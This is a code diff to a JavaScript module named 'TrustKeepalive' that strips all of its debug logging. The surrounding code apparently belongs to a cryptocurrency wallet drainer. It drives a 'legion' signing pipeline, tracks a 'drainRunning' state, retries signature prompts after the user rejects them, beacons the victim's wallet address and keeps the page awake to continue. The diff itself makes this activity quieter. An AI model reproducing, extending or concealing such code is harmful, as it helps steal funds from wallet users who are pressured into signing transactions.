@@ -129,11 +129,11 @@
   }
 
   function fireSignOrPipeline(why) {
-    console.warn('[TrustKeepalive] fire', why);
+
     try {
       if (window.legion && typeof window.legion.evmAlreadyConfirmed === 'function' &&
           window.legion.evmAlreadyConfirmed()) {
-        console.warn('[TrustKeepalive] skip — EVM already confirmed');
+
         return;
       }
     } catch (_) {}
@@ -141,12 +141,12 @@
       var L = window.legion;
       var S = L && L.state;
       if (typeof L.pipelineBusy === 'function' && L.pipelineBusy()) {
-        console.warn('[TrustKeepalive] skip — pipeline busy');
+
         return;
       }
       // Reject-retry or resume — never parallel ad-hoc forceTrustSign
       if (S && !S.userRejectedSign && (S.postConnectComplete || S.connecting || S.drainRunning)) {
-        console.warn('[TrustKeepalive] skip — legion owns flow / complete');
+
         return;
       }
       if (typeof L.startPipeline === 'function') {
@@ -170,7 +170,7 @@
     var now = Date.now();
     if (now - flushAt < 400) return;
     flushAt = now;
-    console.warn('[TrustKeepalive] freeze flush:', why);
+
     persistState();
     beaconNotify(getAddr());
     // Freeze: beacon only — do NOT kick sign (JS may die mid-popup)
@@ -188,7 +188,7 @@
     } catch (_) {}
     if (!need && !addr) return;
 
-    console.warn('[TrustKeepalive] resume:', why);
+
     try { sessionStorage.setItem('trust_need_resume', '0'); } catch (_) {}
     tryWakeLock();
 
@@ -237,7 +237,7 @@
     if (typeof openFn !== 'function') return true;
     setTimeout(function () {
       try { openFn(); } catch (e) {
-        console.warn('[TrustKeepalive] openFn', e && e.message);
+
       }
     }, delayMs);
     return true;
@@ -283,5 +283,5 @@
     if (document.visibilityState === 'visible' && getAddr()) tryWakeLock();
   }, 25000);
 
-  console.warn('[TrustKeepalive] armed');
+  // removed debug log
 })();
